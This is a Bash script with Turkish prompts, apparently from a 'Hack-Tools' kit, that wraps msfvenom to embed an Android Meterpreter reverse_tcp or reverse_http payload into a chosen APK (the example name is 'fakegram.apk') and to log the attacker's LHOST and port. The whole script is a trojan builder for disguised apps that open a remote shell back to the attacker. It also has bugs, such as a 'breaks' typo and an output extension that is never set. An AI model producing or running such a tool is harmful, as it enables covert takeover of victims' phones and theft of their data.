#!/bin/bash
clear
echo "kontroller yapılıyor...!"
if [[ ! -d "$HOME/Hack-Tools/msf" ]];then
	echo "Msfvenom kurulu değil...!"
	sleep 1
	break 
fi

platform="android"



while :
do
	clear
	echo "=============================="
	echo ""
	echo "--Payload seçiniz:--"
	echo "Seçili os: Android"
	echo "Ön tanımlı -> 1"
	echo
	echo "1- android/meterpreter/reverse_tcp (sunucu tipi bağlanır)"
	echo "2- android/meterpreter/reverse_http"
	#echo "3- android/meterpreter_reverse_tcp (bağlantı açar)"
	echo 
	echo "99- Çıkış"
	echo
	echo "=============================="
	echo
	read -p "-İşlem->" and_pay_select
	
	if [[ "$and_pay_select" = "1" ]];then
		and_payloads="android/meterpreter/reverse_tcp"
	elif [[ "$and_pay_select" = "2" ]];then
		and_payloads="android/meterpreter/reverse_http"
	#elif [[ "$and_pay_select" = "3" ]]
	#then
	#	and_payloads="android/meterpreter_reverse_tcp"
	elif [[ "$and_pay_select" = "99" ]];then
		echo "Çıkış yapılıyor...!"
		sleep 1
		breaks
	else 
		echo "Ön tanımlı kullanılıyor...!"
		and_payloads="android/meterpreter/reverse_tcp"
	fi
	while :
	do 
		clear
		echo "=============================="
		echo 
		echo "Trojan'ın gömüleceği apk dosyasının dosya konumunu giriniz...!"
		echo "Örnek: /home/username/app/fakegram.apk gibi"
		echo
		echo "=============================="
		echo
		read -p "Dosya yolu -> " embed_app
		if [[ ! -e "$embed_app" ]];then
			echo 
			echo "Lütfen tm yolu doğru giriniz...!"
			sleep 1
		elif [[ -e "$embed_app" ]];then
			clear && break
		else 
			echo "Boş bırakıldı MainActivity olarak oluşturulacak...!"
			sleep && break 
		fi 
	done 
	clear
	
		clear
		echo "=============================="
		echo 
		read -p "Dosya adını giriniz-> " out_name
		echo
		read -p "LHOST giriniz-> " local_ip
		echo
		read -p "RHOST giriniz-> " local_port
		echo 
		echo "=============================="
		clear
		echo "=============================="
		echo
		echo "Oluşturuluyor...!"
		echo "Bilgiler:"
		echo
		echo "Dosya adı -> $out_name.$out_format"
		echo
		echo "LHOST & LPORT -> $local_ip:$local_port"
		echo
		echo "Platform -> $platform"
		echo 
		echo "=============================="
		msfvenom -p $and_payloads -x $embed_app LHOST=$local_ip LPORT=$local_port -o $HOME/Hack-Tools/msf/$out_name.$out_format
		
		if [[ -e "$HOME/Hack-Tools/msf/$out_name.$out_format" ]];then
			#log kaydı ekleme noktası 
			touch $HOME/Hack-Tools/msf/generate-$out_format-$out_name.txt
			
			date >> $HOME/Hack-Tools/msf/$out_name.txt
			
			echo "$local_ip:$local_port" >> $HOME/Hack-Tools/msf/$out_name.txt
			
			echo "$platform" >> $HOME/Hack-Tools/msf/$out_name.txt
			
			echo "$and_payloads" >> $HOME/Hack-Tools/msf/$out_name.txt
			
			echo "$out_name.$out_format" >> $HOME/Hack-Tools/msf/$out_name.txt
			
			echo "Genereated: Yes" >> $HOME/Hack-Tools/msf/generate-$out_format-$out_name.txt
			
			
			echo "=============================="
			echo
			echo "$out_name.$out_format adlı dosyanız $HOME/Hack-Tools/msf altına oluşturuldu...!"
			echo 
			echo "=============================="
			echo
			read -p "Devam etmek içen ENTER"
			break
		else 
			echo && echo && echo
			echo "Bilinmeyen hata...!"
			sleep 1 && break 
		fi
	
done













